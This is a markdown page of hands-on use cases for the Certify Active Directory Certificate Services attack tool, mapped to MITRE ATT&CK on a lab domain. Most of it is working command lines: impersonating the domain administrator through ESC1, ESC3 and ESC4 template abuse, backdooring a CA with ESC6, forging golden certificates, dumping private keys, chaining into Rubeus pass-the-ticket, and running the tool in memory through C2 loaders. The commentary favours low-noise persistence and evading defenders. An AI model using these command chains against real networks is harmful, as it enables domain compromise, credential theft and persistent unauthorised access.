# Certify — Hands-On Use Cases

All commands below reflect Certify's **current (post-2.0.0) command surface**, verified live against `Certify/Commands/*.cs` source — see `01 - Overview.md`'s History section before reusing any command line from older material. Lab values throughout use a `ghostpack.local` domain and a CA reachable as `ca01.ghostpack.local\GHOSTPACK-CA` (the `SERVER\CA-NAME` format Certify itself validates against).

## Enumerating Certificate Templates and Certificate Authorities

**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/) (Steal or Forge Authentication Certificates) — MITRE's own reference list for this technique cites Certify by name

```
Certify.exe enum-cas
Certify.exe enum-templates
```

Baseline sweep: `enum-cas` walks root CAs, `NTAuthCertificates`, and every enterprise/enrollment CA (with per-CA vulnerability classification and published-template list). `enum-templates` walks every readable `pKICertificateTemplate` object with full flag/EKU/ACL detail. Run with no filters first to see the complete picture before narrowing.

## Filtering for Exploitable Templates

**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/)

```
Certify.exe enum-templates --filter-enabled --filter-vulnerable --filter-client-auth
```

The realistic first-pass triage command: only templates that are (a) actually published/enabled on some CA, (b) flagged with at least one ESC ID by the classifier, and (c) usable for client authentication. This is the shortlist worth reading in full before picking a target template.

```
Certify.exe enum-templates --filter-vulnerable --show-all-perms
```

Same filter, but with every ACE printed rather than the interesting subset — useful when confirming *which specific principal* holds the Enroll/write rights that tripped an ESC4 flag, rather than just knowing the template is flagged.

## Classifying Vulnerabilities Against a Specific Compromised Principal

**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/)

```
Certify.exe enum-templates --target-user svc-web --filter-vulnerable
```

Rather than classifying against generic low-privileged groups, this re-runs the classifier as if evaluating from `svc-web`'s own group memberships — the realistic assumed-breach question: "given the specific account I already control, what does AD CS let me do?" Compare against `--current-user`, which does the same thing for the account Certify is actually running as.

## Enumerating PKI Object Access Controls

**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/)

```
Certify.exe enum-pkiobjects --show-linked-oids
```

Surfaces access controls on enterprise OID objects, including issuance policies linked to a domain group — the data ESC13 classification depends on, exposed directly for manual review of the group-linkage chain.

## Exploiting ESC1 — Arbitrary SAN Impersonation

**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/) (Steal or Forge Authentication Certificates), [T1078.002](https://attack.mitre.org/techniques/T1078/002/) (Valid Accounts: Domain Accounts) — the resulting certificate is alternate authentication material for a domain account

```
Certify.exe request --ca "ca01.ghostpack.local\GHOSTPACK-CA" --template "VulnUserTemplate" --upn "administrator@ghostpack.local"
```

Requests a certificate against a template flagged ESC1 by `enum-templates`, supplying `administrator@ghostpack.local` as the UPN SAN. Because the template allows `ENROLLEE_SUPPLIES_SUBJECT`, permits client authentication, requires no approval, and the requester holds Enroll rights, the CA issues a valid certificate for that identity with zero human review. Output is a base64 PFX by default (`--output-pem` for PEM instead). See "Chained Workflow" below for redeeming it.

```
Certify.exe request --ca "ca01.ghostpack.local\GHOSTPACK-CA" --template "VulnMachineTemplate" --machine --dns "dc01.ghostpack.local"
```

Machine-context variant — requests as the local computer account, naming a target DNS SAN. Triggers `ElevationUtil.GetSystem()`'s `winlogon.exe` token-duplication elevation if not already SYSTEM (see `01`).

## Chained Workflow: Certify → Rubeus PKINIT TGT Request

**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/), [T1078.002](https://attack.mitre.org/techniques/T1078/002/)

The realistic real-world chain: the certificate Certify mints isn't the objective by itself — it's redeemed for a Kerberos TGT via PKINIT, exactly the way `Rubeus/01 - Overview.md`'s Techniques table already documents `asktgt`/`diamond /certificate:` support.

```
# Step 1 — Certify mints a cert impersonating administrator (ESC1)
Certify.exe request --ca "ca01.ghostpack.local\GHOSTPACK-CA" --template "VulnUserTemplate" --upn "administrator@ghostpack.local"

# Step 2 — hand the base64 PFX straight to Rubeus for a PKINIT-based TGT
Rubeus.exe asktgt /user:administrator /domain:ghostpack.local /dc:ca01.ghostpack.local /getcredentials /certificate:MIIR3QIB...(pfx-base64)... /ptt
```

`Rubeus asktgt /certificate:` performs the actual RFC 4556 PKINIT exchange the certificate is for — Certify never touches Kerberos itself (see `01`'s Techniques/Protocols table). `/getcredentials` additionally performs U2U (User-to-User) NT-hash recovery from the PAC, and `/ptt` immediately applies the resulting TGT to the current logon session. From this point forward, everything downstream is standard Rubeus/Kerberos-abuse territory — see `Rubeus/02 - Hands-On Use Cases.md` for what comes next.

## Exploiting ESC3 — Certificate Request Agent Abuse

**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/), [T1078.002](https://attack.mitre.org/techniques/T1078/002/)

```
# Prerequisite: first obtain an Enrollment Agent cert against an ESC3-flagged template
Certify.exe request --ca "ca01.ghostpack.local\GHOSTPACK-CA" --template "EnrollmentAgentTemplate" --install

# Then use that agent certificate to request a certificate AS another user, with no
# credential of theirs required at all
Certify.exe request-agent --ca "ca01.ghostpack.local\GHOSTPACK-CA" --template "VulnUserTemplate" --target "administrator" --agent-pfx "C:\Temp\agent.pfx"
```

The second command builds a PKCS#7-wrapped request, co-signed with the held agent certificate, naming `administrator` as `RequesterName` — the CA issues a certificate for `administrator`'s identity without `administrator`'s password, hash, or ticket ever being involved. This is functionally distinct from ESC1: ESC1 abuses a template's own SAN-supply flag directly; ESC3 abuses a *second*, separately-issued agent certificate to request on someone else's behalf regardless of that target template's own SAN-supply setting.

## Exploiting ESC4 — Weak Template ACL, Self-Escalation Then Abuse

**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/) — ATT&CK has no dedicated sub-technique for AD-object ACL abuse specifically; this falls under the same parent technique as the resulting certificate misuse

```
# Step 1 — grant yourself Enroll + WriteDacl rights on a template your account already
# has WriteOwner/WriteDacl/GenericAll over (an ESC4-flagged template)
Certify.exe manage-template --template "WeakAclTemplate" --owner "S-1-5-21-...-1105" --enroll "S-1-5-21-...-1105"

# Step 2 — reconfigure the now-owned template to also allow ENROLLEE_SUPPLIES_SUBJECT
Certify.exe manage-template --template "WeakAclTemplate" --supply-subject

# Step 3 — request against the now-ESC1-shaped template
Certify.exe request --ca "ca01.ghostpack.local\GHOSTPACK-CA" --template "WeakAclTemplate" --upn "administrator@ghostpack.local"
```

ESC4 is a chain, not a one-shot abuse: a weak ACL grants control *over the template object itself*, which is then used to reshape the template into an ESC1-style configuration before the actual certificate abuse happens. This three-step sequence is the realistic exploitation path, not a single command.

## Backdooring a CA Domain-Wide

**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/) — a durable, domain-wide expansion of what can be abused, closer in spirit to persistence than a single credential-theft event, though ATT&CK has no dedicated AD CS persistence sub-technique

```
Certify.exe manage-ca --ca "ca01.ghostpack.local\GHOSTPACK-CA" --esc6
```

Toggles `EDITF_ATTRIBUTESUBJECTALTNAME2` CA-wide — every template on this CA now effectively behaves as if it allowed enrollee-supplied SANs, regardless of each individual template's own flag. This affects **every future enrollment against every template on that CA**, not just one identity, and — per `01`'s finding — forces a `CertSvc` service restart the moment the flag is set. A defender who only monitors individual template ACLs will miss this entirely; the backdoor lives in CA-level registry configuration.

## Requesting a Machine-Account Certificate

**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/), [T1078.002](https://attack.mitre.org/techniques/T1078/002/)

```
Certify.exe request --ca "ca01.ghostpack.local\GHOSTPACK-CA" --template "Machine" --machine --key-size 4096
```

Requests under the local computer account's own identity rather than the operator's — useful for lateral movement scenarios where a machine-authenticated certificate (rather than a user one) is the more natural fit for the target service.

## Downloading a Pending/Approved Certificate Request

**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/)

```
Certify.exe request-download --ca "ca01.ghostpack.local\GHOSTPACK-CA" --id 4127 --private-key <base64-private-key>
```

For templates requiring manager approval (`PEND_ALL_REQUESTS`): the original `request` call returns a pending request ID and the private key alongside a "still pending" status. Once approved out-of-band, `request-download` retrieves the now-issued certificate using the same private key, pairing them back into a usable PFX.

## Renewing an Existing Certificate for Quiet Persistence

**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/)

```
Certify.exe request-renew --ca "ca01.ghostpack.local\GHOSTPACK-CA" --cert-pfx "C:\Temp\administrator.pfx" --cert-pass "P@ssw0rd"
```

Renews an already-issued certificate, inheriting its prior request's SAN/EKU attributes without repeating the original ESC1-style abuse pattern — a lower-noise way to extend a walk-away credential's validity window past its original expiry, without the original vulnerable-template exploitation happening again.

## Offline Golden Certificate Forgery

**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/) — the technique's own name explicitly includes "forge"

```
Certify.exe forge --ca-cert "C:\Temp\stolen-ca.pfx" --ca-pass "cacertpass" --subject "CN=User" --upn "administrator@ghostpack.local" --sid "S-1-5-21-...-500"
```

Fully offline: no LDAP, no MS-WCCE, no network contact of any kind. Requires a stolen CA (or subordinate CA) private key as a prerequisite. Structurally parallel to Golden Ticket forging (`Mimikatz/kerberos (Golden-Silver Ticket)/`, `Rubeus/`'s `golden`) — a stolen signing key substitutes for a stolen `krbtgt` key, and the forged output is redeemed the same way any other cert is, via `Rubeus asktgt /certificate:`. The `--sid` flag is not optional in practice — Certify itself warns at runtime that omitting it risks rejection on any DC enforcing strong certificate mapping (post-KB5014754 default).

## Harvesting Local Certificate and Private Key Material

**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/), [T1552.004](https://attack.mitre.org/techniques/T1552/004/) (Unsecured Credentials: Private Keys)

```
Certify.exe manage-self --dump-certs
```

Pure local Win32 crypto API calls, no network — dumps every certificate and exportable private key already present in the local machine certificate store, as base64 PFX. Useful on a host that already has smart-card-logon or client-auth certificates provisioned, without needing to request anything new.

## In-Memory Execution via a C2 Loader

**MITRE ATT&CK:** [T1055](https://attack.mitre.org/techniques/T1055/) (Process Injection) for the hosting mechanism itself; the command run inside carries whatever ID is listed above

```
execute-assembly C:\Tools\Certify.exe enum-templates --filter-vulnerable
```

Same reflective-.NET-assembly loading pattern already documented for `Rubeus/` and `SharpUp/` — Cobalt Strike's `execute-assembly`, Covenant's equivalent, or Sliver's `execute-assembly` all host a CLR inside an existing beacon/implant process and invoke `Certify.Program.Main()` directly, with no `Certify.exe` ever touching disk on the target. The README's own PowerShell-wrapper instructions (`[Certify.Program]::Main(...)`/`MainString(...)`) describe the same underlying capability without a C2 framework at all — see `01`'s History section.
